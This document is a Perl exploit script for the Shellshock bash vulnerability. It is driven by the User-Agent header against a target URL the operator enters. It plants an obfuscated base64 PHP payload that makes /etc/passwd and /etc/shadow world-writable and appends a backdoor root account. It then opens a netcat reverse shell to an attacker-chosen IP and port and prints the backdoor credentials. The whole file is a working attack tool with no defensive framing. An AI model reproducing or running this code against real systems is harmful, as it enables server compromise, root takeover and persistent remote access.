#!/usr/bin/perl
 
use LWP::UserAgent;
use LWP::Simple;
$ua = LWP::UserAgent ->new;
system("cls");

print "[X]usage: she.pl http://www.target.com\n";
chomp(my $TARGET=<STDIN>);
  
my $Payload = "<?php eval(base64_decode('JGxuc3Bvb2YxID0gYmFzZTY0X2RlY29kZSgiYkc0Z0wyVjBZeTl3WVhOemQyUT0".
"iKTsKJGxuc3Bvb2YyID0gYmFzZTY0X2RlY29kZSgiYkc0Z0wyVjBZeTl6YUdGa2IzYz0iKTsKc3lzdGVtKCRsbnNwb29mMSk7IApzeXN".
"0ZW0oJ2NobW9kIDc3NyBwYXNzd2QnKTsKc3lzdGVtKCdjaG1vZCA3Nzcgc2hhZG93Jyk7CiRmMSA9ICdwYXNzd2QnOyAKJGMxID0gZmls".
"ZV9nZXRfY29udGVudHMoJGYxKTsKJGMxIC49ICJrZWRhbnM6QXo3YUtTUGpYR0N5azowOjA6Oi86L2Jpbi9zaCI7CmZpbGVfcHV0X2Nvbn".
"RlbnRzKCRmMSwgJGMxKTsKJGYyID0gJ3NoYWRvdyc7CiRjMiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmMik7CiRjMiAuPSAia2VkYW5zOkF6N".
"2FLU1BqWEdDeWs6MDowOjovOi9iaW4vc2giOwpmaWxlX3B1dF9jb250ZW50cygkZjIsICRjMik7CiRScHcwZCA9IGJhc2U2NF9kZWNvZGUo".
"ImNtVndiR0ZqWlNCbWNtOXRJQzlsZEdNdmNHRnpjM2RrSUR3Z2NHRnpjM2RrIik7CiRSc2hkMCA9IGJhc2U2NF9kZWNvZGUoImNtVndiR0Z".
"qWlNCbWNtOXRJQzlsZEdNdmMyaGhaRzkzSUR3Z2MyaGhaRzkzIik7CnN5c3RlbSgkUnB3MGQpOwpzeXN0ZW0oJFJzaGQwKTs=')); ?>";

my $bash = "() { :;}; /bin/bash -c 'echo ".$Payload." > k3d.php'";
my $w00t = "() { :;}; /bin/bash -c 'php k3d.php'";

print "[!] Wait.... ";
sleep(2);

$ua->agent($bash);
$response=$ua->get($TARGET);
if ($response->content =~ /500/){
print "[+] Bash ShellShock successfully exploited\n";
}else{ print "[-] The System maybe no't vulnerable\n";} 

$ua->agent($w00t);
$response=$ua->get($TARGET);
if ($response->content =~ /500/){
print "[+] Successfully Spoofing /etc/* & Add new root user\n";
}else{ print "[-] The Payload Un- Injected!\n";}

print "[2] Enter you IP for Bind : \n";
chomp(my $IP=<STDIN>);
print "[3] Enter the Bind Port (ex: 31337): \n";
chomp(my $PORT=<STDIN>);
my $bind = "() { :;}; /bin/bash -c 'nc ".$IP." ".$PORT." -e /bin/sh'";
$ua->agent($bind);
$response=$ua->get($TARGET);
if ($response->content =~ /500/){
print "[+] Successfully!! Creat Back Connection\n";
print "  - Bind NetCat : $IP & $PORT\n";
print "  - Login with' : \n";
print "    Username : SpyEyE\n";
print "    Password : SpyEyE\n";
print "  - Infos : kedans:Az7aKSPjXGCyk:0:0::/:/bin/sh \n"; 
}else{ print "[-]Sorry Exploit Faild!\n";}
